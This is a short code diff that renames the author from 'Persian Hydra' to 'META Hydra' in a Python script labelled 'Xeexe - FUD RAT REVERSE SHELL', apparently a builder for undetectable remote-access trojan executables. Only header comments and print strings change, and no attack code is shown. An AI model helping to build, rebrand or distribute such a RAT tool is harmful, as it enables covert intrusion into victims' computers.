@@ -3,10 +3,10 @@
 
 # @name   : Xeexe - FUD RAT REVERSE SHELL  
 # @url    : https://github.com/persianhydra/Xeexe
-# @author : Persian Hydra (Persian_hydra@pm.me) 
+# @author : META Hydra 
 
 #            ---------------------------------------------------
-#                         Xeexe by PersianHydra                                                 
+#                         Xeexe by MetaHydra                                                 
 #            ---------------------------------------------------
 #                               Copyright (C) <2020>   
 #
@@ -229,6 +229,6 @@ if __name__ == "__main__":
 		print(print_success(f"Xeexe File [{exe_name}.exe]"))
 	print("\n")
 	
-	print(print_status("Persian Hydra\n"))
+	print(print_status("METAHYDRA\n"))
 	print(print_success("Happy Hacking Xeexe\n"))
 	
